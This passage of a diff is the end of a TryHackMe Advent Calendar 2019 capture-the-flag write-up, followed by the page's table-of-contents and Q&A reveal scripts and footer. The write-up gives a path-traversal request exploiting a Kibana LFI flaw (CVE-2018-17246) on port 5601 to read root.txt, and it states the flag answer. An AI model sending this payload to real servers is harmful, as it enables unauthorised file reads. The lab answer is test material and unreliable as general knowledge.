+  </li>
+  <li>
+    <p>Googled it and found a LFI vuln <a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a></p>
+  </li>
+  <li>
+    <p>In this, it is shown how to gain access through a reverse shell, but as we do not have anywhere to upload files, we will use it to get the contents of the file.</p>
+  </li>
+  <li>
+    <p>Used this on the 5601 port: <code class="language-plaintext highlighter-rouge">/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../root.txt</code></p>
+  </li>
+  <li>
+    <p>As the website was hanging, I thought this is not working, but I remembered the log file that we have on port 8000.</p>
+  </li>
+  <li>
+    <p>After a bit of banging my head against the wall there, I found the flag:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2019/flaggg.png" alt="" /></p>
+
+<p>A: someELKfun</p>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
